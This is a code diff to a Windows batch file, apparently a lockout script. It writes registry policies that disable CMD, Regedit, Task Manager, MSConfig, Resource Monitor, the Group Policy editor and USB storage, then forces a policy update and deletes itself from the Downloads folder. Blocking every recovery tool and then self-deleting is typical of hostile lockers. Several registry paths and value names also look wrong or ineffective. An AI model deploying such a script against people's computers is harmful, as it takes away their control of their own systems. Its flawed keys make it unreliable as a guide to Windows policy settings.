@@ -37,12 +37,19 @@ REM Disable CMD
 reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows" /v "DisableCMD" /t REG_DWORD /d 2 /f
 REM Disable Regedit
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f
+REM Disable Resmon
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableResmon" /t REG_DWORD /d 1 /f
+REM Disable MSConfig
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableMSCONFIG" /t REG_DWORD /d 1 /f
 REM Disable TaskMng
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f
 REM Disable GPedit
 reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v "Restrict_Run" /t REG_DWORD /d 1 /f
 REM Disable USB Storage
 reg add "HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\USBSTOR" /v "Start" /t REG_DWORD /d 4 /f
+
+
+
 gpupdate /force
 cd %USERPROFILE%\downloads
-delete cu.bat
+del cu.bat
